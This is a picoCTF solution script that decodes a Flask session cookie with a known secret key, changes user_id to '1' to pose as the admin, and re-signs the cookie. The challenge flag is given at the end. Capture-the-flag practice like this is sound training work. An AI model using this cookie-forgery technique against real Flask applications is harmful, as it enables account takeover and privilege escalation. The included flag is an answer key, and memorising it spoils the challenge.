def decode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

def encode_flask_cookie(secret_key, values):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(values)

secret_key = "06f4eefabf03b8f4e521fbdada13f65c"
cookie = ".eJwlz0uKAzEMANG7eJ2FLevnXKaxZIkJgRnoTlYhd0-HOcCDqlfZco_jp1wf-zMuZbutci1R3UHDRFPAh7Br1mwdnLzWnKJM2Z0V2Y2MdQR7hZwaKlXGasTaJ53WaotEgF65E0_GQUvWkjE7kLpSBwQSGEviC1o2WeVS_Nhze_zd4_fsQWtgQtQoYQiYGapP7TbHUCLgjgaCeLrnEfv_BJb3BzNfPTg.DphuhA.NICxSV6TT2QVSln-hIJdTw-nJEI"
decoded = decode_flask_cookie(secret_key, cookie)
print(decoded)
decoded["user_id"] = '1'
print(encode_flask_cookie(secret_key, decoded))

"""
Given the secret key, we are able to decode the session cookie and sign our own. After decoding the cookie, we find that
there is a key called uesr_id, which is set to some number. Intuitively, the admin user should be the first one, so
we can change our user id to 1 and re-sign the cookie to view the flag.

picoCTF{1_id_to_rule_them_all_1879a381}
"""
